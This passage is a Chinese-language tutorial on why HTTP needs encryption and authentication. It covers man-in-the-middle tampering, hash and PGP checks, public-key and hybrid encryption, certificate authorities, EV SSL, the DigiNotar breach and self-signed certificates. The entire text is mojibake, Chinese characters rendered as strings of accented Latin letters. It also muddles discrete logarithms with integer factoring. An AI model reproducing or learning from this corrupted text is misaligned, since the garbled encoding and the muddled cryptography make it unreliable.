æ¢å¥è¯è¯´ï¼Œæ²¡æœ‰ä»»ä½•åŠžæ³•ç¡®è®¤ï¼Œå‘å‡ºçš„è¯·æ±‚ / å“åº”å’ŒæŽ¥æ”¶åˆ°çš„è¯·æ±‚ / å“åº”æ˜¯å‰åŽç›¸åŒçš„ã€‚ æ¯”å¦‚ï¼Œä»ŽæŸä¸ª Web ç½‘ç«™ä¸Šä¸‹è½½å†…å®¹ï¼Œæ˜¯æ— æ³•ç¡®å®šå®¢æˆ·ç«¯ä¸‹è½½çš„æ–‡ä»¶å’ŒæœåŠ¡å™¨ä¸Šå­˜æ”¾çš„æ–‡ä»¶æ˜¯å¦å‰åŽä¸€è‡´çš„ã€‚æ–‡ä»¶å†…å®¹åœ¨ä¼ è¾“é€”ä¸­å¯èƒ½å·²ç»è¢«ç¯¡æ”¹ä¸ºå…¶ä»–çš„å†…å®¹ã€‚å³ä½¿å†…å®¹çœŸçš„å·²æ”¹å˜ï¼Œä½œä¸ºæŽ¥æ”¶æ–¹çš„å®¢æˆ·ç«¯ä¹Ÿæ˜¯è§‰å¯Ÿä¸åˆ°çš„ã€‚åƒè¿™æ ·ï¼Œè¯·æ±‚æˆ–å“åº”åœ¨ä¼ è¾“é€”ä¸­ï¼Œé­æ”»å‡»è€…æ‹¦æˆªå¹¶ç¯¡æ”¹å†…å®¹çš„æ”»å‡»ç§°ä¸ºä¸­é—´äººæ”»å‡»ï¼ˆMan-in-the-Middle attackï¼ŒMITMï¼‰ã€‚ å¦‚ä½•é˜²æ­¢ç¯¡æ”¹ è™½ç„¶æœ‰ä½¿ç”¨ HTTP åè®®ç¡®å®šæŠ¥æ–‡å®Œæ•´æ€§çš„æ–¹æ³•ï¼Œä½†äº‹å®žä¸Šå¹¶ä¸ä¾¿æ·ã€å¯é ã€‚å…¶ä¸­å¸¸ç”¨çš„æ˜¯ MD5 å’Œ SHA-1 ç­‰æ•£åˆ—å€¼æ ¡éªŒçš„æ–¹æ³•ï¼Œä»¥åŠç”¨æ¥ç¡®è®¤æ–‡ä»¶çš„æ•°å­—ç­¾åæ–¹æ³•ã€‚ æä¾›æ–‡ä»¶ä¸‹è½½æœåŠ¡çš„ Web ç½‘ç«™ä¹Ÿä¼šæä¾›ç›¸åº”çš„ä»¥ PGPï¼ˆPrettyGood Privacyï¼Œå®Œç¾Žéšç§ï¼‰åˆ›å»ºçš„æ•°å­—ç­¾ååŠ MD5 ç®—æ³•ç”Ÿæˆçš„æ•£åˆ—å€¼ã€‚PGP æ˜¯ç”¨æ¥è¯æ˜Žåˆ›å»ºæ–‡ä»¶çš„æ•°å­—ç­¾åï¼ŒMD5 æ˜¯ç”±å•å‘å‡½æ•°ç”Ÿæˆçš„æ•£åˆ—å€¼ã€‚ä¸è®ºä½¿ç”¨å“ªä¸€ç§æ–¹æ³•ï¼Œéƒ½éœ€è¦æ“çºµå®¢æˆ·ç«¯çš„ç”¨æˆ·æœ¬äººäº²è‡ªæ£€æŸ¥éªŒè¯ä¸‹è½½çš„æ–‡ä»¶æ˜¯å¦å°±æ˜¯åŽŸæ¥æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚æµè§ˆå™¨æ— æ³•è‡ªåŠ¨å¸®ç”¨æˆ·æ£€æŸ¥ã€‚å¯æƒœçš„æ˜¯ï¼Œç”¨è¿™äº›æ–¹æ³•ä¹Ÿä¾ç„¶æ— æ³•ç™¾åˆ†ç™¾ä¿è¯ç¡®è®¤ç»“æžœæ­£ç¡®ã€‚å› ä¸º PGP å’Œ MD5 æœ¬èº«è¢«æ”¹å†™çš„è¯ï¼Œç”¨æˆ·æ˜¯æ²¡æœ‰åŠžæ³•æ„è¯†åˆ°çš„ã€‚ä¸ºäº†æœ‰æ•ˆé˜²æ­¢è¿™äº›å¼Šç«¯ï¼Œæœ‰å¿…è¦ä½¿ç”¨ HTTPSã€‚SSL æä¾›è®¤è¯å’ŒåŠ å¯†å¤„ç†åŠæ‘˜è¦åŠŸèƒ½ã€‚ä»…é  HTTP ç¡®ä¿å®Œæ•´æ€§æ˜¯éžå¸¸å›°éš¾çš„ï¼Œå› æ­¤é€šè¿‡å’Œå…¶ä»–åè®®ç»„åˆä½¿ç”¨æ¥å®žçŽ°è¿™ä¸ªç›®æ ‡ã€‚ HTTP+ åŠ å¯† + è®¤è¯ + å®Œæ•´æ€§ä¿æŠ¤ = HTTPSHTTP åŠ ä¸ŠåŠ å¯†å¤„ç†å’Œè®¤è¯ä»¥åŠå®Œæ•´æ€§ä¿æŠ¤åŽå³æ˜¯ HTTPSå¦‚æžœåœ¨ HTTP åè®®é€šä¿¡è¿‡ç¨‹ä¸­ä½¿ç”¨æœªç»åŠ å¯†çš„æ˜Žæ–‡ï¼Œæ¯”å¦‚åœ¨ Web é¡µé¢ä¸­è¾“å…¥ä¿¡ç”¨å¡å·ï¼Œå¦‚æžœè¿™æ¡é€šä¿¡çº¿è·¯é­åˆ°çªƒå¬ï¼Œé‚£ä¹ˆä¿¡ç”¨å¡å·å°±æš´éœ²äº†ã€‚å¦å¤–ï¼Œå¯¹äºŽ HTTP æ¥è¯´ï¼ŒæœåŠ¡å™¨ä¹Ÿå¥½ï¼Œå®¢æˆ·ç«¯ä¹Ÿå¥½ï¼Œéƒ½æ˜¯æ²¡æœ‰åŠžæ³•ç¡®è®¤é€šä¿¡æ–¹çš„ã€‚å› ä¸ºå¾ˆæœ‰å¯èƒ½å¹¶ä¸æ˜¯å’ŒåŽŸæœ¬é¢„æƒ³çš„é€šä¿¡æ–¹åœ¨å®žé™…é€šä¿¡ã€‚å¹¶ä¸”è¿˜éœ€è¦è€ƒè™‘åˆ°æŽ¥æ”¶åˆ°çš„æŠ¥æ–‡åœ¨é€šä¿¡é€”ä¸­å·²ç»é­åˆ°ç¯¡æ”¹è¿™ä¸€å¯èƒ½æ€§ã€‚ä¸ºäº†ç»Ÿä¸€è§£å†³ä¸Šè¿°è¿™äº›é—®é¢˜ï¼Œéœ€è¦åœ¨ HTTP ä¸Šå†åŠ å…¥åŠ å¯†å¤„ç†å’Œè®¤è¯ç­‰æœºåˆ¶ã€‚æˆ‘ä»¬æŠŠæ·»åŠ äº†åŠ å¯†åŠè®¤è¯æœºåˆ¶çš„ HTTP ç§°ä¸º HTTPSï¼ˆHTTPSecureï¼‰ã€‚ ç»å¸¸ä¼šåœ¨ Web çš„ç™»å½•é¡µé¢å’Œè´­ç‰©ç»“ç®—ç•Œé¢ç­‰ä½¿ç”¨ HTTPS é€šä¿¡ã€‚ä½¿ç”¨HTTPS é€šä¿¡æ—¶ï¼Œä¸å†ç”¨ http://ï¼Œè€Œæ˜¯æ”¹ç”¨ https://ã€‚å¦å¤–ï¼Œå½“æµè§ˆå™¨è®¿é—® HTTPS é€šä¿¡æœ‰æ•ˆçš„ Web ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨çš„åœ°å€æ å†…ä¼šå‡ºçŽ°ä¸€ä¸ªå¸¦é”çš„æ ‡è®°ã€‚å¯¹ HTTPS çš„æ˜¾ç¤ºæ–¹å¼ä¼šå› æµè§ˆå™¨çš„ä¸åŒè€Œæœ‰æ‰€æ”¹å˜ã€‚ HTTPS æ˜¯èº«æŠ« SSL å¤–å£³çš„ HTTPHTTPS å¹¶éžæ˜¯åº”ç”¨å±‚çš„ä¸€ç§æ–°åè®®ã€‚åªæ˜¯ HTTP é€šä¿¡æŽ¥å£éƒ¨åˆ†ç”¨SSLï¼ˆSecure Socket Layerï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼‰åè®®ä»£æ›¿è€Œå·²ã€‚ é€šå¸¸ï¼ŒHTTP ç›´æŽ¥å’Œ TCP é€šä¿¡ã€‚å½“ä½¿ç”¨ SSL æ—¶ï¼Œåˆ™æ¼”å˜æˆå…ˆå’Œ SSL é€šä¿¡ï¼Œå†ç”± SSL å’Œ TCP é€šä¿¡äº†ã€‚ç®€è¨€ä¹‹ï¼Œæ‰€è°“ HTTPSï¼Œå…¶å®žå°±æ˜¯èº«æŠ«SSL åè®®è¿™å±‚å¤–å£³çš„ HTTPã€‚ åœ¨é‡‡ç”¨ SSL åŽï¼ŒHTTP å°±æ‹¥æœ‰äº† HTTPS çš„åŠ å¯†ã€è¯ä¹¦å’Œå®Œæ•´æ€§ä¿æŠ¤è¿™äº›åŠŸèƒ½ã€‚ SSL æ˜¯ç‹¬ç«‹äºŽ HTTP çš„åè®®ï¼Œæ‰€ä»¥ä¸å…‰æ˜¯ HTTP åè®®ï¼Œå…¶ä»–è¿è¡Œåœ¨åº”ç”¨å±‚çš„ SMTP å’Œ Telnet ç­‰åè®®å‡å¯é…åˆ SSL åè®®ä½¿ç”¨ã€‚å¯ä»¥è¯´ SSL æ˜¯å½“ä»Šä¸–ç•Œä¸Šåº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ç½‘ç»œå®‰å…¨æŠ€æœ¯ã€‚ ç›¸äº’äº¤æ¢å¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯†æŠ€æœ¯åœ¨å¯¹ SSL è¿›è¡Œè®²è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹åŠ å¯†æ–¹æ³•ã€‚SSL é‡‡ç”¨ä¸€ç§å«åšå…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-key cryptographyï¼‰çš„åŠ å¯†å¤„ç†æ–¹å¼ã€‚è¿‘ä»£çš„åŠ å¯†æ–¹æ³•ä¸­åŠ å¯†ç®—æ³•æ˜¯å…¬å¼€çš„ï¼Œè€Œå¯†é’¥å´æ˜¯ä¿å¯†çš„ã€‚é€šè¿‡è¿™ç§æ–¹å¼å¾—ä»¥ä¿æŒåŠ å¯†æ–¹æ³•çš„å®‰å…¨æ€§ã€‚åŠ å¯†å’Œè§£å¯†éƒ½ä¼šç”¨åˆ°å¯†é’¥ã€‚æ²¡æœ‰å¯†é’¥å°±æ— æ³•å¯¹å¯†ç è§£å¯†ï¼Œåè¿‡æ¥è¯´ï¼Œä»»ä½•äººåªè¦æŒæœ‰å¯†é’¥å°±èƒ½è§£å¯†äº†ã€‚å¦‚æžœå¯†é’¥è¢«æ”»å‡»è€…èŽ·å¾—ï¼Œé‚£åŠ å¯†ä¹Ÿå°±å¤±åŽ»äº†æ„ä¹‰ã€‚ å…±äº«ç§˜é’¥åŠ å¯†çš„å›°å¢ƒ åŠ å¯†å’Œè§£å¯†åŒç”¨ä¸€ä¸ªç§˜é’¥çš„æ–¹å¼æˆä¸ºå…±äº«å¯†é’¥åŠ å¯†ï¼ˆCommon key crypto systemï¼‰ï¼Œä¹Ÿè¢«å«åšå¯¹ç§°å¯†é’¥åŠ å¯†ã€‚ ä»¥å…±äº«å¯†é’¥æ–¹å¼åŠ å¯†æ—¶å¿…é¡»å°†å¯†é’¥ä¹Ÿå‘ç»™å¯¹æ–¹ã€‚é‚£ä¹ˆè¦æ€Žä¹ˆæ ·æ‰èƒ½å®‰å…¨åœ°å‘é€å¯†é’¥ï¼Ÿ ä½¿ç”¨ä¸¤æŠŠå¯†é’¥çš„å…¬å¼€å¯†é’¥åŠ å¯† å…¬å¼€å¯†é’¥åŠ å¯†æ–¹å¼å¾ˆå¥½åœ°è§£å†³äº†å…±äº«å¯†é’¥åŠ å¯†çš„å›°éš¾ã€‚ å…¬å¼€å¯†é’¥åŠ å¯†ä½¿ç”¨ä¸€å †éžå¯¹ç§°å¯†é’¥ã€‚ä¸€æŠŠå«åšç§æœ‰å¯†é’¥ï¼ˆprivate keyï¼‰ï¼Œå¦ä¸€æŠŠå«åšå…¬å¼€å¯†é’¥ï¼ˆpublic keyï¼‰ã€‚é¡¾åæ€ä¹‰ï¼Œç§æœ‰å¯†é’¥ä¸èƒ½è®©å…¶ä»–ä»»ä½•äººçŸ¥é“ï¼Œè€Œå…¬å¼€å¯†é’¥åˆ™å¯ä»¥éšæ„å‘å¸ƒï¼Œä»»ä½•äººéƒ½å¯ä»¥çŸ¥é“ã€‚ ä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†çš„æ–¹å¼ï¼Œå‘é€å¯†æ–‡çš„ä¸€æ–¹ä½¿ç”¨å¯¹æ–¹çš„å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œå¯¹æ–¹æ”¶åˆ°è¢«åŠ å¯†çš„æ¶ˆæ¯åŽï¼Œå†ä½¿ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥è¿›è¡Œè§£å¯†ã€‚åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œä¸éœ€è¦å‘é€ç”¨åŠ›è§£å¯†çš„ç§æœ‰å¯†é’¥ï¼Œä¹Ÿä¸å¿…æ‹…å¿ƒå¯†é’¥è¢«æ”»å‡»è€…çªƒå¬è€Œç›—èµ°ã€‚ å¦å¤–ï¼Œè¦æƒ³æ ¹æ®å¯†æ–‡å’Œå…¬å¼€å¯†é’¥ï¼Œæ¢å¤åˆ°ä¿¡æ¯åŽŸæ–‡æ˜¯å¼‚å¸¸å›°éš¾çš„ï¼Œå› ä¸ºè§£å¯†è¿‡ç¨‹å°±æ˜¯åœ¨å¯¹ç¦»æ•£å¯¹æ•°è¿›è¡Œæ±‚å€¼ï¼Œè¿™å¹¶éžè½»è€Œæ˜“ä¸¾å°±èƒ½åŠžåˆ°çš„ã€‚å¦‚æžœå¯¹äºŽä¸€ä¸ªéžå¸¸å¤§çš„æ•´æ•°èƒ½åšåˆ°å¿«é€Ÿåœ°å› å¼åˆ†è§£ï¼Œé‚£ä¹ˆå¯†ç ç ´è§£è¿˜æ˜¯å­˜åœ¨å¸Œæœ›çš„ã€‚ä½†ç›®å‰çš„æŠ€æœ¯æ¥è¯´ä¸å¤ªçŽ°å®žã€‚ HTTPS é‡‡ç”¨æ··åˆåŠ å¯†æœºåˆ¶ HTTPS é‡‡ç”¨å…±äº«å¯†é’¥åŠ å¯†å’Œå…¬å¼€å¯†é’¥åŠ å¯†ä¸¤è€…å¹¶ç”¨çš„æ··åˆåŠ å¯†æœºåˆ¶ã€‚è‹¥å¯†é’¥èƒ½å¤Ÿå®žçŽ°å®‰å…¨äº¤æ¢ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½ä¼šè€ƒè™‘ä»…ä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†é€šä¿¡ã€‚ä½†æ˜¯å…¬å¼€å¯†é’¥åŠ å¯†ä¸Žå…±äº«å¯†é’¥æœºå¯†ç›¸æ¯”ï¼Œå…¶å¤„ç†é€Ÿåº¦è¦æ…¢ã€‚ æ‰€ä»¥åº”å……åˆ†åˆ©ç”¨ä¸¤è€…å„è‡ªçš„ä¼˜åŠ¿ï¼Œå°†å¤šç§æ–¹æ³•ç»„åˆèµ·æ¥ç”¨äºŽé€šä¿¡ã€‚åœ¨äº¤æ¢å¯†é’¥çŽ¯èŠ‚ä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†æ–¹å¼ï¼Œä¹‹åŽçš„å»ºç«‹é€šä¿¡äº¤æ¢æŠ¥æ–‡é˜¶æ®µåˆ™ä½¿ç”¨å…±äº«å¯†é’¥åŠ å¯†æ–¹å¼ã€‚ è¯æ˜Žå…¬å¼€å¯†é’¥æ­£ç¡®æ€§çš„è¯ä¹¦å…¬å¼€å¯†é’¥åŠ å¯†è¿˜å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œé‚£å°±æ˜¯æ— æ³•è¯æ˜Žå…¬å¼€å¯†é’¥æœ¬èº«å°±æ˜¯è´§çœŸä»·å®žçš„å…¬å¼€å¯†é’¥ã€‚æ¯”å¦‚ï¼Œæ­£å‡†å¤‡å’ŒæŸå°æœåŠ¡å™¨å»ºç«‹å…¬å¼€å¯†é’¥åŠ å¯†æ–¹å¼ä¸‹çš„é€šä¿¡æ—¶ï¼Œå¦‚ä½•è¯æ˜Žæ”¶åˆ°çš„å…¬å¼€å¯†é’¥å°±æ˜¯åŽŸæ¥æœ¬é¢„æƒ³çš„é‚£å°æœåŠ¡å™¨å‘åž‹çš„å…¬å¼€å¯†é’¥ã€‚æˆ–è®¸åœ¨å…¬å¼€å¯†é’¥ä¼ è¾“é€”ä¸­ï¼ŒçœŸæ­£çš„å…¬å¼€å¯†é’¥å·²ç»è¢«æ”»å‡»è€…æ›¿æ¢æŽ‰äº†ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨æ•°å­—è¯ä¹¦è®¤è¯æœºæž„ï¼ˆCAï¼ŒCertificate Authorityï¼‰å’Œå…¶ç›¸å…³æœºå…³é¢å‘çš„å…¬å¼€å¯†é’¥è¯ä¹¦ã€‚ æ•°å­—è¯ä¹¦è®¤è¯æœºæž„å¤„äºŽå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨åŒæ–¹éƒ½ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæž„çš„ç«‹åœºä¸Šã€‚å¨ç‘žä¿¡ï¼ˆVeriSignï¼‰å°±æ˜¯å…¶ä¸­ä¸€å®¶éžå¸¸æœ‰åçš„æ•°å­—è¯ä¹¦è®¤è¯æœºæž„ã€‚ æ•°å­—è¯ä¹¦è®¤è¯æœºæž„çš„ä¸šåŠ¡æµç¨‹ï¼š é¦–å…ˆï¼ŒæœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘æ•°å­—è¯ä¹¦è®¤è¯æœºæž„æå‡ºå…¬å¼€çš„å¯†é’¥çš„ç”³è¯·ã€‚æ•°å­—è¯ä¹¦è®¤è¯æœºæž„åœ¨åˆ¤æ˜Žæå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åŽï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶åŽåˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬é’¥è¯ä¹¦åŽç»‘å®šåœ¨ä¸€èµ·ã€‚ æœåŠ¡å™¨ä¼šå°†è¿™ä»½ç”±æ•°å­—è¯ä¹¦è®¤è¯æœºæž„é¢å‘çš„å…¬é’¥è¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ï¼Œä»¥è¿›è¡Œå…¬å¼€å¯†é’¥åŠ å¯†æ–¹å¼é€šä¿¡ã€‚å…¬é’¥è¯ä¹¦ä¹Ÿå«åšæ•°å­—è¯ä¹¦æˆ–ç›´æŽ¥ç§°ä¸ºè¯ä¹¦ã€‚ æŽ¥åˆ°è¯ä¹¦çš„å®¢æˆ·ç«¯å¯ä½¿ç”¨æ•°å­—è¯ä¹¦è®¤è¯æœºæž„çš„å…¬å¼€å¯†é’¥ï¼Œå¯¹é‚£å¼ è¯ä¹¦ä¸Šçš„æ•°å­—ç­¾åè¿›è¡ŒéªŒè¯ï¼Œä¸€æ—¦éªŒè¯é€šè¿‡ï¼Œå®¢æˆ·ç«¯ä¾¿å¯æ˜Žç¡®ä¸¤ä»¶äº‹æƒ…ï¼šä¸€ï¼Œè®¤è¯æœåŠ¡å™¨çš„å…¬å¼€å¯†é’¥çš„æ˜¯çœŸå®žæœ‰æ•ˆçš„æ•°å­—è¯ä¹¦è®¤è¯æœºæž„ã€‚äºŒï¼ŒæœåŠ¡å™¨çš„å…¬å¼€å¯†é’¥æ˜¯å€¼å¾—ä¿¡èµ–çš„ã€‚ æ­¤å¤„è®¤è¯æœºå…³çš„å…¬å¼€å¯†é’¥å¿…é¡»å®‰å…¨åœ°è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ä½¿ç”¨é€šä¿¡æ–¹å¼æ—¶ï¼Œå¦‚ä½•å®‰å…¨çš„è½¬äº¤æ˜¯ä¸€ä»¶å›°éš¾çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œå¤šæ•°æµè§ˆå™¨å¼€å‘å•†å‘å¸ƒç‰ˆæœ¬æ—¶ï¼Œä¼šäº‹å…ˆåœ¨å†…éƒ¨æ¤å…¥å¸¸ç”¨è®¤è¯æœºå…³çš„å…¬å¼€å¯†é’¥ã€‚ å¯è¯æ˜Žç»„ç»‡çœŸå®žæ€§çš„ EV SSL è¯ä¹¦ è¯ä¹¦çš„ä¸€ä¸ªä½œç”¨æ˜¯ç”¨æ¥è¯æ˜Žä½œä¸ºé€šä¿¡ä¸€æ–¹çš„æœåŠ¡å™¨æ˜¯å¦è§„èŒƒï¼Œå¦å¤–ä¸€ä¸ªä½œç”¨å°±æ˜¯ç¡®è®¤å¯¹æ–¹æœåŠ¡å™¨èƒŒåŽè¿è¥çš„ä¼ä¸šæ˜¯å¦çœŸå®žå­˜åœ¨ã€‚æ‹¥æœ‰è¯¥ç‰¹æ€§çš„è¯ä¹¦å°±æ˜¯ EV SSL è¯ä¹¦ï¼ˆExtended Validation SSL Certificateï¼‰ EV SSL è¯ä¹¦ æ˜¯åŸºäºŽå›½é™…æ ‡å‡†çš„è®¤è¯æŒ‡å¯¼æ–¹é’ˆé¢å‘çš„è¯ä¹¦ã€‚å…¶ä¸¥æ ¼è§„å®šè§„å®šäº†å¯¹è¿è¥ç»„ç»‡æ˜¯å¦çœŸå®žçš„ç¡®è®¤æ–¹é’ˆï¼Œå› æ­¤ï¼Œé€šè¿‡è®¤è¯çš„ Web ç½‘ç«™èƒ½å¤ŸèŽ·å¾—æ›´é«˜çš„è®¤å¯åº¦ã€‚ æŒæœ‰ EV SSL è¯ä¹¦çš„ Web ç½‘ç«™çš„æµè§ˆå™¨åœ°å€æ å¤„çš„èƒŒæ™¯è‰²æ˜¯ç»¿è‰²çš„ã€‚è€Œä¸”åœ¨å·¦ä¾§æ˜¾ç¤ºäº† SSL è¯ä¹¦ä¸­è®°å½•çš„ç»„ç»‡åç§°ä»¥åŠé¢å‘è¯ä¹¦çš„è®¤è¯æœºæž„çš„åç§°ã€‚ ç”¨ä»¥ç¡®è®¤å®¢æˆ·ç«¯çš„å®¢æˆ·ç«¯è¯ä¹¦ HTTPS ä¸­è¿˜å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¯ä¹¦ã€‚ä»¥å®¢æˆ·ç«¯è¯ä¹¦è¿›è¡Œå®¢æˆ·ç«¯è®¤è¯ï¼Œè¯æ˜ŽæœåŠ¡å™¨æ­£åœ¨é€šä¿¡çš„å¯¹æ–¹å§‹ç»ˆæ˜¯é¢„æ–™ä¹‹å†…çš„å®¢æˆ·ç«¯ï¼Œå…¶ä½œç”¨è·ŸæœåŠ¡å™¨è¯ä¹¦å¦‚å‡ºä¸€è¾™ã€‚ ä½†å®¢æˆ·ç«¯è¯ä¹¦ä»å­˜åœ¨å‡ å¤„é—®é¢˜ç‚¹ã€‚å…¶ä¸­çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯è¯ä¹¦çš„èŽ·å–å’Œå‘å¸ƒã€‚ æƒ³èŽ·å–è¯ä¹¦æ—¶ï¼Œç”¨æˆ·å¾—è‡ªè¡Œå®‰è£…å®¢æˆ·ç«¯è¯ä¹¦ã€‚ä½†ç”±äºŽå®¢æˆ·ç«¯è¯ä¹¦æ˜¯è¦ä»˜è´¹ä½¿ç”¨çš„ï¼Œä¸”æ¯å¼ è¯ä¹¦å¯¹åº”åˆ°æ¯ä½ç”¨æˆ·ä¹Ÿå°±æ„å‘³ç€éœ€æ”¯ä»˜å’Œç”¨æˆ·å¯¹ç­‰çš„è´¹ç”¨ã€‚å¦å¤–ï¼Œè¦è®©çŸ¥è¯†å±‚æ¬¡ä¸åŒçš„ç”¨æˆ·ä»¬è‡ªè¡Œå®‰è£…è¯ä¹¦ï¼Œè¿™ä»¶äº‹æœ¬èº«ä¹Ÿå……æ»¡äº†å„ç§æŒ‘æˆ˜ã€‚ çŽ°çŠ¶æ˜¯ï¼Œå®‰å…¨æ€§æžé«˜çš„è®¤è¯æœºæž„å¯é¢å‘å®¢æˆ·ç«¯è¯ä¹¦ä½†ä»…ç”¨äºŽç‰¹æ®Šç”¨é€”çš„ä¸šåŠ¡ã€‚æ¯”å¦‚é‚£äº›å¯æ”¯æ’‘å®¢æˆ·ç«¯è¯ä¹¦æ”¯å‡ºè´¹ç”¨çš„ä¸šåŠ¡ã€‚ å®¢æˆ·ç«¯è¯ä¹¦å­˜åœ¨çš„å¦ä¸€ä¸ªé—®é¢˜ç‚¹æ˜¯ï¼Œå®¢æˆ·ç«¯è¯ä¹¦æ¯•ç«Ÿåªç”¨æ¥è¯æ˜Žå®¢æˆ·ç«¯å®žé™…å­˜åœ¨ï¼Œè€Œä¸èƒ½ç”¨æ¥è¯æ˜Žç”¨æˆ·æœ¬äººçš„çœŸå®žæœ‰æ•ˆæ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦èŽ·å¾—äº†å®‰è£…æœ‰å®¢æˆ·ç«¯è¯ä¹¦çš„è®¡ç®—æœºçš„ä½¿ç”¨æƒé™ï¼Œä¹Ÿå°±æ„å‘³ç€åŒæ—¶æ‹¥æœ‰äº†å®¢æˆ·ç«¯è¯ä¹¦çš„ä½¿ç”¨æƒé™ã€‚ è®¤è¯æœºæž„ä¿¡èª‰ç¬¬ä¸€ SSL æœºåˆ¶ä¸­ä»‹å…¥è®¤è¯æœºæž„ä¹‹æ‰€ä»¥å¯è¡Œï¼Œæ˜¯å› ä¸ºå»ºç«‹åœ¨å…¶ä¿¡ç”¨ç»å¯¹å¯é è¿™ä¸€å¤§å‰æä¸‹çš„ã€‚ç„¶è€Œï¼Œ2011 å¹´ 7 æœˆï¼Œè·å…°çš„ä¸€å®¶åå«DigiNotar çš„è®¤è¯æœºæž„æ›¾é­é»‘å®¢ä¸æ³•å…¥ä¾µï¼Œé¢å¸ƒäº† google.com å’Œtwitter.com ç­‰ç½‘ç«™çš„ä¼ªé€ è¯ä¹¦äº‹ä»¶ã€‚è¿™ä¸€äº‹ä»¶ä»Žæ ¹æœ¬ä¸Šæ’¼åŠ¨äº†SSL çš„å¯ä¿¡åº¦ã€‚å› ä¸ºä¼ªé€ è¯ä¹¦ä¸Šæœ‰æ­£è§„è®¤è¯æœºæž„çš„æ•°å­—ç­¾åï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šåˆ¤å®šè¯¥è¯ä¹¦æ˜¯æ­£å½“çš„ã€‚å½“ä¼ªé€ çš„è¯ä¹¦è¢«ç”¨åšæœåŠ¡å™¨ä¼ªè£…ä¹‹æ—¶ï¼Œç”¨æˆ·æ ¹æœ¬æ— æ³•å¯Ÿè§‰åˆ°ã€‚è™½ç„¶å­˜åœ¨å¯å°†è¯ä¹¦æ— æ•ˆåŒ–çš„è¯ä¹¦åŠé”€åˆ—è¡¨ï¼ˆCertificate Revocation Listï¼ŒCRLï¼‰æœºåˆ¶ï¼Œä»¥åŠä»Žå®¢æˆ·ç«¯åˆ é™¤æ ¹è¯ä¹¦é¢å‘æœºæž„ï¼ˆRoot Certificate Authorityï¼ŒRCAï¼‰çš„å¯¹ç­–ï¼Œä½†æ˜¯è·ç¦»ç”Ÿæ•ˆè¿˜éœ€è¦ä¸€æ®µæ—¶é—´ï¼Œè€Œåœ¨è¿™æ®µæ—¶é—´å†…ï¼Œåˆ°åº•ä¼šæœ‰å¤šå°‘ç”¨æˆ·çš„åˆ©ç›Šè’™å—æŸå¤±å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚ ç”±è‡ªè®¤è¯æœºæž„é¢å‘çš„è¯ä¹¦ç§°ä¸ºè‡ªç­¾åè¯ä¹¦ å¦‚æžœä½¿ç”¨ OpenSSL è¿™å¥—å¼€æºç¨‹åºï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥æž„å»ºä¸€å¥—å±žäºŽè‡ªå·±çš„è®¤è¯æœºæž„ï¼Œä»Žè€Œè‡ªå·±ç»™è‡ªå·±é¢å‘æœåŠ¡å™¨è¯ä¹¦ã€‚ä½†è¯¥æœåŠ¡å™¨è¯ä¹¦åœ¨äº’è”ç½‘ä¸Šä¸å¯ä½œä¸ºè¯ä¹¦ä½¿ç”¨ï¼Œä¼¼ä¹Žæ²¡ä»€ä¹ˆå¸®åŠ©ã€‚ç‹¬ç«‹æž„å»ºçš„è®¤è¯æœºæž„å«åšè‡ªè®¤è¯æœºæž„ï¼Œç”±è‡ªè®¤è¯æœºæž„é¢å‘çš„â€œæ— ç”¨â€è¯ä¹¦ä¹Ÿè¢«æˆç§°ä¸ºè‡ªç­¾åè¯ä¹¦ã€‚æµè§ˆå™¨è®¿é—®è¯¥æœåŠ¡å™¨æ—¶ï¼Œä¼šæ˜¾ç¤ºâ€œæ— æ³•ç¡®è®¤è¿žæŽ¥å®‰å…¨æ€§â€æˆ–â€œè¯¥ç½‘ç«™çš„å®‰å…¨è¯ä¹¦å­˜åœ¨é—®é¢˜â€ç­‰è­¦å‘Šæ¶ˆæ¯ã€‚ ç”±è‡ªè®¤è¯æœºæž„é¢å‘çš„æœåŠ¡å™¨è¯ä¹¦ä¹‹æ‰€ä»¥ä¸èµ·ä½œç”¨ï¼Œæ˜¯å› ä¸ºå®ƒæ— æ³•æ¶ˆé™¤ä¼ªè£…çš„å¯èƒ½æ€§ã€‚è‡ªè®¤è¯æœºæž„èƒ½å¤Ÿäº§ç”Ÿçš„ä½œç”¨é¡¶å¤šä¹Ÿå°±æ˜¯è‡ªå·±å¯¹å¤–å®£ç§°â€œæˆ‘æ˜¯â—‹â—‹â€çš„è¿™ç§ç¨‹åº¦ã€‚å³ä½¿é‡‡ç”¨è‡ªç­¾åè¯ä¹¦ï¼Œé€šè¿‡ SSLåŠ 